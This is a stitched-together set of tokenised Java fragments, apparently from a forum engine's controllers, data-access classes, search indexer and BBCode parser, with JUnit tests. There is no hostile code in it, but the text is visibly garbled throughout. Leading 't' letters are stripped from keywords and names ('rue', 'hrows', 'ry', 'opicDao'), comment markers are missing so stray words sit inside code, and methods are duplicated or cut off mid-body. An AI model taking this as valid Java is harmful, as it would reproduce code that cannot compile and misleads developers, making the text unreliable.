. isModeratorSession ( ) | | mpl . isCorrectorSession ( ) ) { int uncommited = opicDao . getUncommitedCount ( ) ; mv . getModel ( ) . put ( " uncommited " , uncommited ) ; int uncommitedNews = 0 ; if ( uncommited > 0 ) { uncommitedNews = opicDao . getUncommitedCount ( Section . SECTION_NEWS ) ; } mv . getModel ( ) . put ( " uncommitedNews " , uncommitedNews ) ; } mv . getModel ( ) . put ( " showAdsense " , ! mpl . isSessionAuthorized ( ) | | ! mpl . getProf ( ) . isHideAdsense ( ) ) ; return mv ; } 
public static void updateLastLogin ( Authentication authentication , UserDao userDao ) { if ( authentication ! = null & & ( authentication . isAuthenticated ( ) ) ) { Object principal = authentication . getPrincipal ( ) ; 
private static String fixFormat ( String mode ) { if ( ! " quot " . equals ( mode ) & & ! " ntobr " . equals ( mode ) & & ! " lorcode " . equals ( mode ) ) { return ( String ) DefaultProfile . getDefaultProfile ( ) . get ( " format.mode " ) ; } return mode ; } 
private static String fixStyle ( String style ) { if ( ! DefaultProfile . isStyle ( style ) ) { return ( String ) DefaultProfile . getDefaultProfile ( ) . get ( STYLE_PROPERTY ) ; } return style ; } 
public static Profile createDefault ( ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < String , String > ( ) ) , null ) ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( HOVER_PROPERTY , Boolean . TRUE ) ; builder . put ( STYLE_PROPERTY , " ango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " quot " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , rue ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , rue ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "poll", "top10", "gallery", "tagcloud", "archive", "ibm" ); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public View rackerOldUrl ( @RequestParam ( value = " filter " , defaultValue = " all " ) String filterAction , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; TrackerFilterEnum defaultFilter = mpl . getProf ( ) . getTrackerMode ( ) ; RedirectView redirectView = new RedirectView ( " /tracker/ " ) ; redirectView . setExposeModelAttributes ( false ) ; Optional < TrackerFilterEnum > filter = TrackerFilterEnum . getByValue ( filterAction ) ; if ( filter . isPresent ( ) & & filter . get ( ) ! = defaultFilter ) { redirectView . setUrl ( " /tracker/?filter= " + URLEncoder . encode ( filterAction , " UTF-8 " ) ) ; } return redirectView ; } 
public ArchiveDTO mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new ArchiveDTO ( section , group , rs . getInt ( " year " ) , rs . getInt ( " month " ) , rs . getInt ( " c " ) ) ; } 
protected ModelAndView getData ( HttpServletRequest request ) hrows Exception { List < ArchiveDao . ArchiveStats > list = archiveDao . getLatestArchiveStats ( sectionNews , 13 ) ; return new ModelAndView ( " boxlets/archive " , " items " , list ) ; } 
public ModelAndView archiveList ( int sectionid , String groupName ) hrows Exception { ModelAndView mv = new ModelAndView ( " view-news-archive " ) ; Section section = sectionService . getSection ( sectionid ) ; mv . getModel ( ) . put ( " section " , section ) ; Group group = null ; if ( groupName ! = null ) { group = groupDao . getGroup ( section , groupName ) ; } mv . getModel ( ) . put ( " group " , group ) ; List < ArchiveDao . ArchiveStats > items = archiveDao . getArchiveStats ( section , group ) ; mv . getModel ( ) . put ( " items " , items ) ; return mv ; } 
private RowMapper < ArchiveStats > mapper ( final Section section , final Group group ) { return new RowMapper < ArchiveStats > ( ) { @Override 
public ArchiveStats mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new ArchiveStats ( section , group , rs . getInt ( " year " ) , rs . getInt ( " month " ) , rs . getInt ( " c " ) ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) hrows MessageNotFoundException { Topic msg = opicDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) & & ! msg . isDraft ( ) ) { updateMessage ( msg ) ; } else { client . prepareDelete ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( msg . getId ( ) ) ) . execute ( ) . actionGet ( ) ; logger.info("Deleting message "+msgid); } if (withComments) { CommentList commentList = commentService.getCommentList(msg, true); 
private boolean isTopicVisible ( Topic msg ) { Section section = sectionService . getSection ( msg . getSectionId ( ) ) ; if ( section . isPremoderated ( ) & & ! msg . isCommited ( ) ) { return false ; } return ! msg . isDeleted ( ) & & ! msg . isDraft ( ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) hrows MessageNotFoundException { Topic msg = opicDao . getById ( msgid ) ; if ( isTopicVisible ( msg ) ) { updateMessage ( msg ) ; 
public void handleMessage ( UpdateMonth msgUpdate ) hrows MessageNotFoundException , IOException { if ( ! mappingsSet ) { createIndex ( ) ; } int month = msgUpdate . getMonth ( ) ; int year = msgUpdate . getYear ( ) ; logger . info ( " Indexing month " + year + '/' + month ) ; long startTime = System . nanoTime ( ) ; List < Integer > opicIds = opicDao . getMessageForMonth ( year , month ) ; for ( int opicId : opicIds ) { reindexMessage ( opicId , rue ) ; } long endTime = System . nanoTime ( ) ; logger . info ( " Reindex month " + year + '/' + month + " done, " + ( endTime - startTime ) / 1000000 + " millis " ) ; } 
private FilterBuilder andFilters ( List < FilterBuilder > filters ) { if ( filters . size ( ) = = 1 ) { return filters . get ( 0 ) ; 
public ModelAndView handleRequestInternal ( @RequestParam ( " section " ) int sectionid , HttpServletResponse response ) { Section section = sectionService . getSection ( sectionid ) ; Map < String , Object > params = new HashMap < > ( ) ; params . put ( " section " , section ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; response . setDateHeader ( " Expires " , new Date ( System . currentTimeMillis ( ) - 20 * 3600 * 1000 ) . getTime ( ) ) ; response . setDateHeader ( " Last-Modified " , new Date ( System . currentTimeMillis ( ) - 2 * 1000 ) . getTime ( ) ) ; return new ModelAndView ( " section " , params ) ; } 
public ModelAndView forum ( HttpServletResponse response ) { return handleRequestInternal ( Section . SECTION_FORUM , response ) ; } 
public static Group buildGroup ( ResultSet rs ) hrows SQLException { int restrict_topics = rs . getInt ( " restrict_topics " ) ; if ( rs . wasNull ( ) ) { restrict_topics = TopicPermissionService . POSTSCORE_UNRESTRICTED ; } Group group = new Group ( rs . getBoolean ( " moderate " ) , rs . getBoolean ( " vote " ) , rs . getBoolean ( " havelink " ) , rs . getInt ( " section " ) , rs . getString ( " linktext " ) , rs . getString ( " urlname " ) , rs . getString ( " image " ) , restrict_topics , rs . getInt ( " restrict_comments " ) , rs . getInt ( " id " ) , rs . getInt ( " stat3 " ) , rs . getBoolean ( " resolvable " ) ) ; group . setTitle ( rs . getString ( " itle " ) ) ; group . setInfo ( rs . getString ( " info " ) ) ; group . setLongInfo ( rs . getString ( " longinfo " ) ) ; return group ; } 
public TopicListDto . DeletedTopic mapRow ( ResultSet rs , int rowNum ) hrows SQLException { return new TopicListDto . DeletedTopic ( rs ) ; } 
public void updateStatsAfterDelete ( int commentId , int count ) { int opicId = jdbcTemplate . queryForObject ( " SELECT topic FROM comments WHERE id=? " , Integer . class , commentId ) ; jdbcTemplate . update ( " UPDATE topics SET stat1=stat1-?, lastmod=CURRENT_TIMESTAMP WHERE id = ? " , count , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat2=stat1 WHERE id=? AND stat2 > stat1 " , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat3=stat1 WHERE id=? AND stat3 > stat1 " , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat4=stat1 WHERE id=? AND stat4 > stat1 " , opicId ) ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( HOVER_PROPERTY , Boolean . TRUE ) ; builder . put ( STYLE_PROPERTY , " ango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " quot " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , rue ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , rue ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "poll", "top10", "gallery", "tagcloud", "archive" ); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public Group getGroup ( Section section , String name ) hrows GroupNotFoundException { Optional < Group > group = getGroupOpt ( section , name , false ) ; if ( ! group . isPresent ( ) ) { logger . info ( " Group '{}' not found in section {} " , name , section . getUrlName ( ) ) ; 
public SectionService sectionService ( SectionDao sectionDao ) { return new SectionService ( sectionDao ) ; } 
public void estBadSection ( ) { sectionService . getSection ( - 1 ) ; } 
public UserDetails loadUserByUsername ( String username ) hrows UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , rue ) ; if ( user = = null ) { hrow new UsernameNotFoundException ( username ) ; } } else { ry { user = userDao . getUser ( username ) ; } catch ( UserNotFoundException e ) { hrow new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , profileDao . readProfile ( user ) ) ; } 
private QueryBuilder processQueryString ( String queryText ) { SimpleQueryStringBuilder esQuery = simpleQueryString ( queryText ) ; esQuery . lenient ( rue ) ; MatchQueryBuilder phraseQuery = matchPhraseQuery ( " _all " , queryText ) ; phraseQuery . setLenient ( rue ) ; BoolQueryBuilder boolQuery = boolQuery ( ) ; boolQuery . should ( esQuery ) ; boolQuery . should ( phraseQuery ) ; return boolQuery ; } 
private QueryBuilder processQueryString ( String queryText ) { CommonTermsQueryBuilder esQuery = commonTerms ( " _all " , queryText ) ; esQuery . lowFreqMinimumShouldMatch ( " 2 " ) ; MatchQueryBuilder phraseQuery = matchPhraseQuery ( " _all " , queryText ) ; phraseQuery . setLenient ( rue ) ; BoolQueryBuilder boolQuery = boolQuery ( ) ; boolQuery . should ( esQuery ) ; boolQuery . should ( phraseQuery ) ; return boolQuery ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( SearchOrder . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String s ) hrows IllegalArgumentException { switch ( s ) { case " 1 " : for old links setValue(SearchOrder.RELEVANCE); break; case "2": setValue(SearchOrder.DATE); break; default: setValue(SearchOrder.valueOf(s)); break; } } }); binder.registerCustomEditor(SearchInterval.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchInterval.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(SearchRange.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchRange.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(User.class, new UserPropertyEditor(userDao)); binder.setBindingErrorProcessor(new ExceptionBindingErrorProcessor()); } 
public void setAsText ( String s ) hrows IllegalArgumentException { switch ( s ) { case " 1 " : for old links 
public boolean isInitial ( ) { return q . isEmpty ( ) & & user = = null ; } 
private QueryBuilder processQueryString ( String queryText ) { if ( queryText . isEmpty ( ) ) { return matchAllQuery ( ) ; 
public RedirectView showComments ( @RequestParam String nick ) hrows Exception { User user = userDao . getUser ( nick ) ; return new RedirectView ( " search.jsp?range=COMMENTS&user= " + user . getNick ( ) + " &sort=DATE " ) ; } 
public boolean isCommentDeletableNow ( Comment comment , @Nullable User currentUser , Topic opic , boolean haveAnswers ) { if ( comment . isDeleted ( ) | | opic . isDeleted ( ) ) { return false ; } if ( currentUser = = null | | currentUser . isAnonymous ( ) ) { return false ; } boolean moderatorMode = currentUser . isModerator ( ) ; boolean authored = currentUser . getId ( ) = = comment . getUserid ( ) ; DateTime deleteDeadline = new DateTime ( comment . getPostdate ( ) ) . plus ( DELETE_PERIOD ) ; return moderatorMode | | ( ! opic . isExpired ( ) & & 
public String renderNodeBBCode ( Node node ) { return " [ " + name + ']' + node . renderChildrenBBCode ( ) ; } 
String parseCommentRSS ( String ext , boolean secure ) { return defaultParser . parseRoot ( prepareCommentRootNode ( secure , rue , false ) , ext ) . renderXHtml ( ) ; } 
private Node closeTagNode ( RootNode rootNode , Node currentNode , String name ) { Node empNode = currentNode ; while ( rue ) { if ( empNode = = rootNode ) { break ; } if ( TagNode . class . isInstance ( empNode ) ) { TagNode node = ( TagNode ) empNode ; String agName = node . getBbtag ( ) . getName ( ) ; if ( agName . equals ( name ) | | ( " url " . equals ( name ) & & " url2 " . equals ( agName ) ) ) { currentNode = empNode ; currentNode = currentNode . getParent ( ) ; break ; } } empNode = empNode . getParent ( ) ; } return currentNode ; } 
public boolean isCloseTag ( ) { return wholematch . startsWith ( " [/ " ) | | wholematch . startsWith ( " [[/ " ) ; } 
public Node lastChildren ( ) { return children . get ( children . size ( ) - 1 ) ; } 
abstract public String renderXHtml ( ) ; abstract public String renderBBCode ( ) ; public String renderChildrenXHtml ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderXHtml ( ) ) ; } return stringBuilder . oString ( ) ; } public String renderChildrenBBCode ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderBBCode ( ) ) ; } return stringBuilder . oString ( ) ; } public String renderOg ( ) { return " " ; } public final String renderChildrenOg ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderOg ( ) ) ; stringBuilder . append ( ' ' ) ; } return stringBuilder . oString ( ) . rim ( ) ; } } 
abstract public String renderBBCode ( ) ; public String renderChildrenXHtml ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderXHtml ( ) ) ; } return stringBuilder . oString ( ) ; } public String renderChildrenBBCode ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderBBCode ( ) ) ; } return stringBuilder . oString ( ) ; } public String renderOg ( ) { return " " ; } public final String renderChildrenOg ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderOg ( ) ) ; stringBuilder . append ( ' ' ) ; } return stringBuilder . oString ( ) . rim ( ) ; } } 
public String renderNodeXhtml ( Node node ) { if ( NodeUtils . isEmptyNode ( node ) ) { return " " ; 
private void rawPushTextNode ( ParserAutomatonState automatonState , Node currentNode , String ext ) { if ( ! automatonState . isCode ( ) ) { currentNode . addChildren ( new TextNode ( currentNode , parserParameters , ext , automatonState ) ) ; 
public void addChildren ( Node node ) { children . add ( node ) ; } 
private void processTagMatcher ( Matcher match ) { agname = match . group ( 1 ) . oLowerCase ( ) ; parameter = match . group ( 3 ) ; wholematch = match . group ( 0 ) ; if ( ! StringUtils . isEmpty ( parameter ) ) { parameter = parameter . substring ( 1 ) ; 
private boolean isTagEscaped ( ) { return wholematch . startsWith ( " [[ " ) & & wholematch . endsWith ( " ]] " ) ; } 
private boolean isCloseTag ( ) { return wholematch . startsWith ( " [/ " ) | | wholematch . startsWith ( " [[/ " ) ; } 
private boolean isFirstCode ( ) { return firstCode ; } 
private ImmutableMap < String , Object > prepareModel ( AddTopicRequest form , User currentUser ) { ImmutableMap . Builder < String , Object > params = ImmutableMap . builder ( ) ; Group group = form . getGroup ( ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; params . put ( " section " , section ) ; String addInfo = sectionService . getAddInfo ( group . getSectionId ( ) ) ; if ( addInfo ! = null ) { params . put ( " addportal " , addInfo ) ; } params . put ( " imagepost " , groupPermissionService . isImagePostingAllowed ( section , currentUser ) ) ; } return params . build ( ) ; } 
private TextNode rawPushTextNode ( ParserAutomatonState automatonState , Node currentNode , String ext ) { if ( ! automatonState . isCode ( ) ) { return new TextNode ( currentNode , parserParameters , ext , automatonState ) ; 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) ; String result ; TagNode agNode = ( TagNode ) node ; RootNode rootNode = agNode . getRootNode ( ) ; ToHtmlFormatter oHtmlFormatter = rootNode . getToHtmlFormatter ( ) ; boolean secure = rootNode . isSecure ( ) ; UserDao userDao = rootNode . getUserDao ( ) ; ry { if ( userDao ! = null & & oHtmlFormatter ! = null ) { User user = rootNode . getUserDao ( ) . getUser ( memberName ) ; if ( ! user . isBlocked ( ) ) { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" %s \" >%s</a></span> " , oHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; rootNode . addReplier ( user ) ; } else { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" %s \" >%s</a></s></span> " , oHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; } } else { result = Parser . escape ( memberName ) ; } } catch ( Exception ex ) { result = String . format ( " <s>%s</s> " , Parser . escape ( memberName ) ) ; } return result ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode xtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( xtNode . getText ( ) ) . rim ( ) ; TagNode agNode = ( TagNode ) node ; RootNode rootNode = agNode . getRootNode ( ) ; ToHtmlFormatter oHtmlFormatter = rootNode . getToHtmlFormatter ( ) ; boolean secure = rootNode . isSecure ( ) ; UserDao userDao = rootNode . getUserDao ( ) ; String result ; ry { if ( userDao ! = null & & oHtmlFormatter ! = null ) { User user = rootNode . getUserDao ( ) . getUser ( memberName ) ; if ( ! user . isBlocked ( ) ) { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" %s \" >%s</a></span> " , oHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; rootNode . addReplier ( user ) ; } else { result = String . format ( " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" %s \" >%s</a></s></span> " , oHtmlFormatter . memberURL ( user , secure ) , Parser . escape ( memberName ) ) ; } } else { result = Parser . escape ( memberName ) ; } } catch ( Exception ex ) { result = String . format ( " <s>%s</s> " , Parser . escape ( memberName ) ) ; } return result ; } 
public void initTest ( ) hrows Exception { UserDao userDao = mock ( UserDao . class ) ; User splinter = mock ( User . class ) ; maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . henReturn ( false ) ; when ( JB . isBlocked ( ) ) . henReturn ( false ) ; when ( isden . isBlocked ( ) ) . henReturn ( rue ) ; when ( maxcom . getNick ( ) ) . henReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . henReturn ( " JB " ) ; when ( isden . getNick ( ) ) . henReturn ( " isden " ) ; when ( splinter . isBlocked ( ) ) . henReturn ( false ) ; when ( splinter . getNick ( ) ) . henReturn ( " splinter " ) ; when ( userDao . getUser ( " splinter " ) ) . henReturn ( splinter ) ; when ( userDao . getUser ( " maxcom " ) ) . henReturn ( maxcom ) ; when ( userDao . getUser ( " JB " ) ) . henReturn ( JB ) ; when ( userDao . getUser ( " isden " ) ) . henReturn ( isden ) ; when ( userDao . getUser ( " hizel " ) ) . henThrow ( new UserNotFoundException ( " hizel " ) ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( userDao ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; } 
public void estExtraLines ( ) { user assertEquals(lorCodeService.parseComment("[user]splinter[/user]", false, false), lorCodeService.parseComment("[user]splinter[/user]", false, false)); 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 assertEquals("<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a> <span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false, false)); 
public void userTest ( ) { assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false , false ) ) ; assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false , false ) ) ; assertEquals ( " <p> <s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false , false ) ) ; 
public void parserResultTest ( ) { String msg = " [user]hizel[/user][user]JB[/user][user]maxcom[/user] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; assertTrue ( replier . contains ( maxcom ) ) ; assertTrue ( replier . contains ( JB ) ) ; assertFalse ( replier . contains ( isden ) ) ; } 
public void userTest2 ( ) { assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/USER] " , false , false ) ) ; assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" ext-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [USER]isden[/USER] " , false , false ) ) ; assertEquals ( " <p> <s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/USER] " , false , false ) ) ; 
public void parserResultTest2 ( ) { String msg = " [user]hizel[/user][USER]JB[/user][user]maxcom[/USER] " ; Set < User > replier = lorCodeService . getReplierFromMessage ( msg ) ; assertTrue ( replier . contains ( maxcom ) ) ; assertTrue ( replier . contains ( JB ) ) ; assertFalse ( replier . contains ( isden ) ) ; } 
public void init ( ) hrows Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( mock ( UserDao . class ) ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void listTest ( ) { Assert . assertEquals ( " <ul><li>one</li><li>two</li><li>three</li></ul> " , lorCodeService . parseComment ( " [LIST][*]one[*]two[*]three[/list] " , false , false ) ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/LIST] " , false , false ) ) ; assertEquals ( " <ul><li>one " + 
public void init ( ) hrows Exception { UserDao userDao = mock ( UserDao . class ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( userDao ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void initTest ( ) hrows Exception { String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( mock ( UserDao . class ) ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; } 
public void paragraphLogicTest ( ) { list assertEquals("<p>some1 text</p><p>some2 text</p><ul><li>one</li><li>two</li></ul><p><a href=\"http:www.example.com\">http:www.example.com</a> - some3 text</p>", lorCodeService.parseComment("some1 textsome2 text[list][*]one[*]two[/list][url]http:www.example.com[/url] - some3 text", false, false)); b assertEquals("<p><b><p>te</p><p>xt</p></b></p>", lorCodeService.parseComment("[b]text[/b]", false, false)); i assertEquals("<p><i><p>te</p><p>xt</p></i></p>", lorCodeService.parseComment("[i]text[/i]", false, false)); u assertEquals("<p><u><p>te</p><p>xt</p></u></p>", lorCodeService.parseComment("[u]text[/u]", false, false)); s assertEquals("<p><s><p>te</p><p>xt</p></s></p>", lorCodeService.parseComment("[s]text[/s]", false, false)); em assertEquals("<p><em><p>te</p><p>xt</p></em></p>", lorCodeService.parseComment("[em]text[/em]", false, false)); strong assertEquals("<p><strong><p>te</p><p>xt</p></strong></p>", lorCodeService.parseComment("[strong]text[/strong]", false, false)); p assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[p]text[/p]", false, false)); div assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[div]text[/div]", false, false)); quote assertEquals(citeHeader + "<p>te</p><p>xt</p>" + citeFooter, lorCodeService.parseComment("[quote]text[/quote]", false, false)); cut assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[cut]text[/cut]", false, false)); 
public String renderOg ( ) { return bbtag . renderOg ( his ) ; } 
public String renderOg ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; 
public String renderOg ( Node node ) { return node . renderChildrenOg ( ) ; } 
public Comment getById ( int id ) hrows MessageNotFoundException { Comment comment ; ry { comment = jdbcTemplate . queryForObject ( queryCommentById , ( resultSet , i ) - > new Comment ( resultSet ) , id ) ; } catch ( EmptyResultDataAccessException exception ) { hrow new MessageNotFoundException ( id ) ; } return comment ; } 
public ModelAndView showCommentsOld ( @RequestParam String nick , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } ModelAndView mv = new ModelAndView ( " deleted-comments " ) ; User user = userDao . getUser ( nick ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " deletedList " , commentService . getDeletedComments ( user ) ) ; return mv ; } 
public ModelAndView showCommentsOld ( @PathVariable String nick , HttpServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } ModelAndView mv = new ModelAndView ( " deleted-comments " ) ; User user = userDao . getUser ( nick ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " deletedList " , commentService . getDeletedComments ( user ) ) ; return mv ; } 
